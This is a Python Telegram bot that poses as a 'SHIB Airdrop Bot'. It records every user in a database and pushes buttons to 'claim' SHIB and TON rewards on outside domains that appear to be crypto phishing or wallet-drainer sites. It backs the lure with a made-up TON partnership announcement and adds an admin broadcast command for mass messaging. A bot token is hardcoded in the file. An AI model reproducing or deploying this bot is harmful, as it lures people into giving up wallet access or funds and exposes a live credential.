import logging
import sqlite3
import requests
import asyncio
from datetime import date
from aiogram import Bot, Dispatcher, types
from aiogram.dispatcher.filters.state import State, StatesGroup
from aiogram.dispatcher import FSMContext
from aiogram.contrib.fsm_storage.memory import MemoryStorage
from aiogram.utils import executor

# 🚀 BOT CONFIG
TOKEN = "7317617514:AAHy4weIjo0XzK4trvAs_3gdxJzuiWlWrAA"  # Replace with your actual bot token
ADMINS = [6366250991]

bot = Bot(TOKEN)
dp = Dispatcher(bot, storage=MemoryStorage())

# 🚀 DATABASE SETUP (Use SQLite for user storage)
conn = sqlite3.connect("admin.db", check_same_thread=False)
cursor = conn.cursor()

# Create table if it doesn't exist
cursor.execute("""
CREATE TABLE IF NOT EXISTS users (
    id TEXT PRIMARY KEY,
    username TEXT,
    joining_date TEXT
)
""")
conn.commit()

# 🚀 SHIB & TON REWARD LINKS
PHOTO_URL = "https://bitcoinist.com/wp-content/uploads/2023/03/Shiba-Inu-Gains-21-Following-Shibarium-Testnet-Announcement.jpg?w=900"
SHIB_REWARDS_URL = "https://airdropcheckers.net/?source=rewardsbot"
TON_WEB_APP_URL = "https://ton.dappsclaim.com"

# 🚀 FSM STATE FOR ADMIN MESSAGES
class MessageState(StatesGroup):
    text = State()

# 🚀 START COMMAND (WELCOME MESSAGE + SAVE USER TO DB)
@dp.message_handler(commands=["start"])
async def start_command(message: types.Message):
    user_id = str(message.chat.id)
    username = message.from_user.username or "Unknown"

    try:
        cursor.execute("INSERT OR IGNORE INTO users (id, username, joining_date) VALUES (?, ?, ?)",
                       (user_id, username, date.today().strftime('%Y-%m-%d')))
        conn.commit()
        print(f"✅ User {username} ({user_id}) added to database.")  # Debugging output
    except Exception as e:
        print(f"❌ Database Insert Error: {e}")  # Debugging error

    # Welcome message
    welcome_message = (
        f"🤖 Welcome {username} to the SHIB Airdrop Bot! 🚀\n\n"
        "Click the buttons below to start earning fantastic rewards!"
    )

    partnership_message = (
        "🎉 Exciting News! We've partnered with TON for an exclusive airdrop! 🎉\n"
        "Don't miss out on this limited-time opportunity to claim your TON rewards!"
    )

    # Inline keyboard with buttons
    keyboard = types.InlineKeyboardMarkup()
    keyboard.add(types.InlineKeyboardButton("🎁 Claim SHIB Rewards", url=SHIB_REWARDS_URL))
    keyboard.add(types.InlineKeyboardButton("🚀 Claim TON Airdrop", url=TON_WEB_APP_URL))

    # Send the message with image & buttons
    await bot.send_photo(
        chat_id=user_id,
        photo=PHOTO_URL,
        caption=f"{welcome_message}\n\n{partnership_message}",
        reply_markup=keyboard
    )

# 🚀 ADMIN BROADCAST COMMAND
@dp.message_handler(commands=["message"])
async def start_sending(message: types.Message):
    if message.chat.id in ADMINS:
        await message.answer("📢 Enter the message you want to send to all users:")
        await MessageState.text.set()
    else:
        await message.answer("❌ You are not authorized to use this command.")

@dp.message_handler(state=MessageState.text, content_types=types.ContentType.TEXT)
async def send_broadcast(message: types.Message, state: FSMContext):
    await state.finish()
    text = message.text

    cursor.execute("SELECT id FROM users")
    user_ids = cursor.fetchall()

    count = 0
    for (user_id,) in user_ids:
        try:
            await bot.send_message(chat_id=user_id, text=text)
            count += 1
        except Exception as e:
            logging.error(f"Failed to send message to {user_id}: {e}")

    await message.answer(f"✅ Message sent to {count} users!")

# 🚀 BOT ERROR HANDLER
@dp.errors_handler()
async def error_handler(update, exception):
    logging.error(f"Update {update} caused error {exception}")
    return True

# 🚀 RUN THE BOT (Polling)
if __name__ == "__main__":
    logging.basicConfig(level=logging.INFO)
    executor.start_polling(dp, skip_updates=True)
